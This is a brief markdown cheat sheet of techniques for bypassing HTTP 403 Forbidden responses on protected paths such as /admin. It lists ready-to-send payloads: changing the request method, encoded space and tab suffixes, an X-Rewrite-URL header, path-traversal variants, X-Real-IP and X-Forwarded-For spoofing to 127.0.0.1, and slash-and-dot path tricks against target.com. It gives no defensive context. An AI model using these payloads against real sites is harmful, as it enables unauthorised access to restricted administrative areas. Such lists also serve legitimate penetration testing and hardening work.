### 1. Change request method.
```
POST -> GET
```
```
GET -> POST
```

### 2. Use space symbol.
```
GET /admin%20
```
```
GET /admin%09
```

### 3. X-Rewrite-URL header
```
GET /index.html
X-Rewrite-URL: /admin
```
### 4. Use Path Traversal
```
GET /%2e/admin
```
```
GET /admin/..;/
```
			
### 5. X-Real-IP/X-Forwrded-For
```
GET /admin
X-Real-IP: 127.0.0.1
```
```
GET /admin
X-Forwarded-For: 127.0.0.1
```

### 6. Other Techniques
target.com/secret -> ```403 Forbidden```

target.com/secret/ -> ```200 Ok```

target.com//secret// -> ```200 Ok```

target.com/./secret/./ -> ```200 Ok```

target.com/secret/* -> ```200 Ok```

target.com/. -> ```200 Ok```